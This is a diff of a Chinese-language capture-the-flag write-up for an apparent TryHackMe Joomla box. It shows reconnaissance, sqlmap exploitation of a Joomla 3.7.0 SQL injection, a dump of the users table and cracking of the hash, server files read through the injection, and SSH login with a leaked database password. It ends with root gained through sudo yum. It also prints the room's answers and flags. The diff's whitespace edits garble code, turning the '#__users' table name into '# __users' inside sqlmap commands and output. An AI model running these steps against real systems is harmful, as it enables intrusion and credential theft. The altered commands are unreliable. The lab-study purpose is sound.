@@ -1,7 +1,7 @@
-#服务枚举
+# 服务枚举
 ```
 ┌──(root💀kali)-[~/tryhackme]
-└─# nmap -sV 10.10.36.72 
+└─#  nmap -sV 10.10.36.72 
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-02 05:45 EDT
 Nmap scan report for 10.10.36.72
 Host is up (0.34s latency).
@@ -15,10 +15,10 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 21.94 seconds
 ```
 
-#目录爆破
+# 目录爆破
 ```
 ──(root💀kali)-[~/dirsearch]
-└─# python3 dirsearch.py -u "http://10.10.36.72" -e* -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -t 100
+└─#  python3 dirsearch.py -u "http://10.10.36.72" -e* -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -t 100
 
  _|. _ _  _  _  _ _|_    v0.3.8
 (_||| _) (/_(_|| (_| )
@@ -52,23 +52,23 @@ Task Completed
 ```
 
 
-#存在robots.txt文件，泄露相关文件夹，与爆破出来的基本一致
+# 存在robots.txt文件，泄露相关文件夹，与爆破出来的基本一致
 ```
-# If the Joomla site is installed within a folder 
-# eg www.example.com/joomla/ then the robots.txt file 
-# MUST be moved to the site root 
-# eg www.example.com/robots.txt
-# AND the joomla folder name MUST be prefixed to all of the
-# paths. 
-# eg the Disallow rule for the /administrator/ folder MUST 
-# be changed to read 
-# Disallow: /joomla/administrator/
-#
-# For more information about the robots.txt standard, see:
-# http://www.robotstxt.org/orig.html
-#
-# For syntax checking, see:
-# http://tool.motoricerca.info/robots-checker.phtml
+#  If the Joomla site is installed within a folder 
+#  eg www.example.com/joomla/ then the robots.txt file 
+#  MUST be moved to the site root 
+#  eg www.example.com/robots.txt
+#  AND the joomla folder name MUST be prefixed to all of the
+#  paths. 
+#  eg the Disallow rule for the /administrator/ folder MUST 
+#  be changed to read 
+#  Disallow: /joomla/administrator/
+# 
+#  For more information about the robots.txt standard, see:
+#  http://www.robotstxt.org/orig.html
+# 
+#  For syntax checking, see:
+#  http://tool.motoricerca.info/robots-checker.phtml
 
 User-agent: *
 Disallow: /administrator/
@@ -87,10 +87,10 @@ Disallow: /plugins/
 Disallow: /tmp/
 ```
 
-#用msf探测版本
+# 用msf探测版本
 ```
 ──(root💀kali)-[~]
-└─# msfconsole -q                                                                                                                                                                                                                       1 ⨯
+└─#  msfconsole -q                                                                                                                                                                                                                       1 ⨯
 msf6 > use auxiliary/scanner/http/joomla_version
 msf6 auxiliary(scanner/http/joomla_version) > options
 
@@ -116,7 +116,7 @@ msf6 auxiliary(scanner/http/joomla_version) > run
 [*] Auxiliary module execution completed
 ```
 
-#得到cms版本
+# 得到cms版本
 Joomla version: 3.7.0
 
 ```
@@ -124,10 +124,10 @@ question：What is the Joomla version?
 answer:3.7.0
 ```
 
-#查询cms漏洞,存在sql注入
+# 查询cms漏洞,存在sql注入
 ```
 ┌──(root💀kali)-[~]
-└─# searchsploit Joomla 3.7.0                                                                                                                                                                                                         130 ⨯
+└─#  searchsploit Joomla 3.7.0                                                                                                                                                                                                         130 ⨯
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                                                                                                                            |  Path
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
@@ -137,7 +137,7 @@ Joomla! Component Easydiscuss < 4.0.21 - Cross-Site Scripting                   
 Shellcodes: No Results
 ```
 
-#根据42033.txt，使用sqlmap注入
+# 根据42033.txt，使用sqlmap注入
 
 sqlmap -u "http://10.10.211.216/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] --dump --batch
 
@@ -171,90 +171,90 @@ available databases [5]:
 [*] test
 ```
 
-#基于错误，数据库joomla，列出所有数据表
+# 基于错误，数据库joomla，列出所有数据表
 sqlmap -u "http://10.10.211.216/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] --dbms mysql --technique E -D joomla --tables --batch
 ```
 [02:55:45] [INFO] fetching tables for database: 'joomla'
 Database: joomla
 [72 tables]
 +----------------------------+
-| #__assets                  |
-| #__associations            |
-| #__banner_clients          |
-| #__banner_tracks           |
-| #__banners                 |
-| #__categories              |
-| #__contact_details         |
-| #__content_frontpage       |
-| #__content_rating          |
-| #__content_types           |
-| #__content                 |
-| #__contentitem_tag_map     |
-| #__core_log_searches       |
-| #__extensions              |
-| #__fields_categories       |
-| #__fields_groups           |
-| #__fields_values           |
-| #__fields                  |
-| #__finder_filters          |
-| #__finder_links_terms0     |
-| #__finder_links_terms1     |
-| #__finder_links_terms2     |
-| #__finder_links_terms3     |
-| #__finder_links_terms4     |
-| #__finder_links_terms5     |
-| #__finder_links_terms6     |
-| #__finder_links_terms7     |
-| #__finder_links_terms8     |
-| #__finder_links_terms9     |
-| #__finder_links_termsa     |
-| #__finder_links_termsb     |
-| #__finder_links_termsc     |
-| #__finder_links_termsd     |
-| #__finder_links_termse     |
-| #__finder_links_termsf     |
-| #__finder_links            |
-| #__finder_taxonomy_map     |
-| #__finder_taxonomy         |
-| #__finder_terms_common     |
-| #__finder_terms            |
-| #__finder_tokens_aggregate |
-| #__finder_tokens           |
-| #__finder_types            |
-| #__languages               |
-| #__menu_types              |
-| #__menu                    |
-| #__messages_cfg            |
-| #__messages                |
-| #__modules_menu            |
-| #__modules                 |
-| #__newsfeeds               |
-| #__overrider               |
-| #__postinstall_messages    |
-| #__redirect_links          |
-| #__schemas                 |
-| #__session                 |
-| #__tags                    |
-| #__template_styles         |
-| #__ucm_base                |
-| #__ucm_content             |
-| #__ucm_history             |
-| #__update_sites_extensions |
-| #__update_sites            |
-| #__updates                 |
-| #__user_keys               |
-| #__user_notes              |
-| #__user_profiles           |
-| #__user_usergroup_map      |
-| #__usergroups              |
-| #__users                   |
-| #__utf8_conversion         |
-| #__viewlevels              |
+| # __assets                  |
+| # __associations            |
+| # __banner_clients          |
+| # __banner_tracks           |
+| # __banners                 |
+| # __categories              |
+| # __contact_details         |
+| # __content_frontpage       |
+| # __content_rating          |
+| # __content_types           |
+| # __content                 |
+| # __contentitem_tag_map     |
+| # __core_log_searches       |
+| # __extensions              |
+| # __fields_categories       |
+| # __fields_groups           |
+| # __fields_values           |
+| # __fields                  |
+| # __finder_filters          |
+| # __finder_links_terms0     |
+| # __finder_links_terms1     |
+| # __finder_links_terms2     |
+| # __finder_links_terms3     |
+| # __finder_links_terms4     |
+| # __finder_links_terms5     |
+| # __finder_links_terms6     |
+| # __finder_links_terms7     |
+| # __finder_links_terms8     |
+| # __finder_links_terms9     |
+| # __finder_links_termsa     |
+| # __finder_links_termsb     |
+| # __finder_links_termsc     |
+| # __finder_links_termsd     |
+| # __finder_links_termse     |
+| # __finder_links_termsf     |
+| # __finder_links            |
+| # __finder_taxonomy_map     |
+| # __finder_taxonomy         |
+| # __finder_terms_common     |
+| # __finder_terms            |
+| # __finder_tokens_aggregate |
+| # __finder_tokens           |
+| # __finder_types            |
+| # __languages               |
+| # __menu_types              |
+| # __menu                    |
+| # __messages_cfg            |
+| # __messages                |
+| # __modules_menu            |
+| # __modules                 |
+| # __newsfeeds               |
+| # __overrider               |
+| # __postinstall_messages    |
+| # __redirect_links          |
+| # __schemas                 |
+| # __session                 |
+| # __tags                    |
+| # __template_styles         |
+| # __ucm_base                |
+| # __ucm_content             |
+| # __ucm_history             |
+| # __update_sites_extensions |
+| # __update_sites            |
+| # __updates                 |
+| # __user_keys               |
+| # __user_notes              |
+| # __user_profiles           |
+| # __user_usergroup_map      |
+| # __usergroups              |
+| # __users                   |
+| # __utf8_conversion         |
+| # __viewlevels              |
 +----------------------------+
 ```
 
-#列举所有#__users的数据
-sqlmap -u "http://10.10.211.216/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] --dbms mysql --technique E -D joomla -T "#__users" --columns  -C username,password --dump  --batch
+# 列举所有# __users的数据
+sqlmap -u "http://10.10.211.216/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] --dbms mysql --technique E -D joomla -T "# __users" --columns  -C username,password --dump  --batch
 
 ```
 [*] starting @ 03:42:08 /2021-09-03/
@@ -276,14 +276,14 @@ Parameter: list[fullordering] (GET)
 web server operating system: Linux CentOS 7
 web application technology: PHP 5.6.40, Apache 2.4.6
 back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
-[03:42:10] [INFO] fetching columns 'password, username' for table '#__users' in database 'joomla'
-[03:42:10] [WARNING] unable to retrieve column names for table '#__users' in database 'joomla'
+[03:42:10] [INFO] fetching columns 'password, username' for table '# __users' in database 'joomla'
+[03:42:10] [WARNING] unable to retrieve column names for table '# __users' in database 'joomla'
 do you want to use common column existence check? [y/N/q] N
-[03:42:10] [INFO] fetching entries of column(s) 'password,username' for table '#__users' in database 'joomla'
+[03:42:10] [INFO] fetching entries of column(s) 'password,username' for table '# __users' in database 'joomla'
 [03:42:11] [INFO] retrieved: '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm'
 [03:42:12] [INFO] retrieved: 'jonah'
 Database: joomla
-Table: #__users
+Table: # __users
 [1 entry]
 +----------+--------------------------------------------------------------+
 | username | password                                                     |
@@ -291,7 +291,7 @@ Table: #__users
 | jonah    | $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm |
 +----------+--------------------------------------------------------------+
 
-[03:42:12] [INFO] table 'joomla.`#__users`' dumped to CSV file '/root/.local/share/sqlmap/output/10.10.211.216/dump/joomla/#__users.csv'
+[03:42:12] [INFO] table 'joomla.`# __users`' dumped to CSV file '/root/.local/share/sqlmap/output/10.10.211.216/dump/joomla/# __users.csv'
 [03:42:12] [WARNING] HTTP error codes detected during run:
 500 (Internal Server Error) - 7 times
 [03:42:12] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.211.216'
@@ -300,17 +300,17 @@ Table: #__users
 [*] ending @ 03:42:12 /2021-09-03/
 ```
 
-#把jonah:$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm 写进hash.txt，用john破解
+# 把jonah:$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm 写进hash.txt，用john破解
 
 ┌──(root💀kali)-[~/tryhackme]
-└─# john --format=bcrypt hash.txt  --wordlist=/usr/share/wordlists/rockyou.txt
+└─#  john --format=bcrypt hash.txt  --wordlist=/usr/share/wordlists/rockyou.txt
 
-#记录一个john的坑
+# 记录一个john的坑
 john的字典参数--wordlist，如果没有写"="号，有可能破解不出来（即：john --format=bcrypt hash.txt  --wordlist /usr/share/wordlists/rockyou.txt）
 详情参考这里：https://www.reddit.com/r/HowToHack/comments/m9w0at/why_isnt_john_cracking_this_bcrypt_hash/
 
-#查看破解的密码
-└─# john --show hash.txt                                                                                                                                                                                                                1 ⨯
+# 查看破解的密码
+└─#  john --show hash.txt                                                                                                                                                                                                                1 ⨯
 jonah:spiderman123
 
 1 password hash cracked, 0 left
@@ -322,16 +322,16 @@ answer:spiderman123
 ```
 
 
-#拿到初始shell
-##测试
+# 拿到初始shell
+# # 测试
 sqlmap -u "http://10.10.49.149/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] --dbms mysql --technique E --file-read /var/www/html/configuration.php  --batch
 
-#读取/var/www/html/configuration.php。找到数据库账号密码，外网不可连接
+# 读取/var/www/html/configuration.php。找到数据库账号密码，外网不可连接
 public $user = 'root';
 public $password = 'nv5uz9r3ZEDzVjNu';
 
 
-#读取/etc/passwd
+# 读取/etc/passwd
 root:x:0:0:root:/root:/bin/bash
 bin:x:1:1:bin:/bin:/sbin/nologin
 daemon:x:2:2:daemon:/sbin:/sbin/nologin
@@ -357,10 +357,10 @@ mysql:x:27:27:MariaDB Server:/var/lib/my
 
 
 
-#利用 jjameson：nv5uz9r3ZEDzVjNu通过ssh登录系统拿到初始shell
+# 利用 jjameson：nv5uz9r3ZEDzVjNu通过ssh登录系统拿到初始shell
 ```
 ┌──(root💀kali)-[~]
-└─# ssh jjameson@10.10.49.149                                                                                                                                                                                                         255 ⨯
+└─#  ssh jjameson@10.10.49.149                                                                                                                                                                                                         255 ⨯
 The authenticity of host '10.10.49.149 (10.10.49.149)' can't be established.
 ECDSA key fingerprint is SHA256:apAdD+3yApa9Kmt7Xum5WFyVFUHZm/dCR/uJyuuCi5g.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
@@ -374,13 +374,13 @@ user.txt
 [jjameson@dailybugle ~]$ 
 ```
 
-#拿到user.txt
+# 拿到user.txt
 ```
 question：What is the user flag?
 answer：27a260fe3cba712cfdedb1c86d80442e
 ```
 
-#通过sudo -l 发现yum命令无需密码就可以用root身份运行
+# 通过sudo -l 发现yum命令无需密码就可以用root身份运行
 ```
 [jjameson@dailybugle ~]$ sudo -l
 匹配 %2$s 上 %1$s 的默认条目：
@@ -393,7 +393,7 @@ answer：27a260fe3cba712cfdedb1c86d80442e
 ```
 
 
-#根据https://gtfobins.github.io/gtfobins/yum/这里的b方法拿到root权限
+# 根据https://gtfobins.github.io/gtfobins/yum/这里的b方法拿到root权限
 ```
 [jjameson@dailybugle ~]$ TF=$(mktemp -d)
 [jjameson@dailybugle ~]$ echo 'id' > $TF/x.sh
@@ -428,14 +428,14 @@ answer：27a260fe3cba712cfdedb1c86d80442e
 [jjameson@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y
 已加载插件：y
 没有匹配 y 的插件
-sh-4.2# id
+sh-4.2#  id
 uid=0(root) gid=0(root) 组=0(root)
-sh-4.2# cat /root/root.txt 
+sh-4.2#  cat /root/root.txt 
 eec3d53292b1821868266858d7fa6f79
-sh-4.2# 
+sh-4.2#  
 ```
 
-#拿到root.txt
+# 拿到root.txt
 ```
 question:What is the root flag?
 answer:eec3d53292b1821868266858d7fa6f79
